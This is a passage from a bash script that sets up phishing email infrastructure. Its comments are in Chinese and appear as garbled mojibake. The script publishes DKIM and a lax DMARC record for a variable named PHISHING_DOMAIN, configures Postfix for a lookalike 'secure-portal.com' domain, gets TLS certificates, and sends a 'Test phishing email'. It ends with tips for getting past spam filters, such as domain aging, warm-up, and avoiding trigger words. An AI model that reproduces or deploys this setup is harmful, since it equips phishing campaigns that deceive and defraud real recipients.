echo "  TXT: default._domainkey.$PHISHING_DOMAIN"
cat default.txt
echo ""
echo "DMARCè®°å½•ï¼ˆå®½æ¾ç­–ç•¥ï¼‰:"
echo "  TXT: _dmarc.$PHISHING_DOMAIN â†’ v=DMARC1; p=none; rua=mailto:dmarc@$PHISHING_DOMAIN"

# æ­¥éª¤3: é…ç½®Postfixå‘ä»¶
cat > /etc/postfix/main.cf << 'EOFPOSTFIX'
myhostname = mail.secure-portal.com
mydomain = secure-portal.com
myorigin = $mydomain
inet_interfaces = all
inet_protocols = ipv4

# SMTPè®¤è¯
smtpd_sasl_type = dovecot
smtpd_sasl_path = private/auth
smtpd_sasl_auth_enable = yes

# TLSåŠ å¯†
smtpd_tls_cert_file=/etc/letsencrypt/live/secure-portal.com/fullchain.pem
smtpd_tls_key_file=/etc/letsencrypt/live/secure-portal.com/privkey.pem
smtpd_use_tls=yes
EOFPOSTFIX

# æ­¥éª¤4: å®‰è£…Let's Encryptè¯ä¹¦
echo "[3] å®‰è£…SSLè¯ä¹¦..."
apt install -y certbot
certbot certonly --standalone -d $PHISHING_DOMAIN -d mail.$PHISHING_DOMAIN

# æ­¥éª¤5: æµ‹è¯•é‚®ä»¶å‘é€
echo "[4] æµ‹è¯•é‚®ä»¶å‘é€..."
echo "Test phishing email" | mail -s "Test" -r "noreply@$PHISHING_DOMAIN" test@gmail.com

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœ… é‚®ä»¶æœåŠ¡å™¨é…ç½®å®Œæˆ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo ""
echo "ğŸ“Š éªŒè¯æ­¥éª¤:"
echo "1. ä½¿ç”¨ mail-tester.com æµ‹è¯•é‚®ä»¶è¯„åˆ†ï¼ˆç›®æ ‡>8åˆ†ï¼‰"
echo "2. å‘é€æµ‹è¯•é‚®ä»¶åˆ°è‡ªå·±çš„Gmail/Outlook"
echo "3. æ£€æŸ¥æ˜¯å¦è¿›å…¥æ”¶ä»¶ç®±ï¼ˆè€Œéåƒåœ¾ç®±ï¼‰"
echo ""
echo "ğŸ’¡ æå‡é€è¾¾ç‡æŠ€å·§:"
echo "  - åŸŸåå¹´é¾„>30å¤©"
echo "  - é€æ­¥å¢åŠ å‘é€é‡ï¼ˆwarm-upï¼‰"
echo "  - é¿å…åƒåœ¾è¯æ±‡ï¼ˆfree, urgent, click hereï¼‰"
echo "  - ä¿æŒä½æŠ•è¯‰ç‡ï¼ˆ<0.1%ï¼‰"
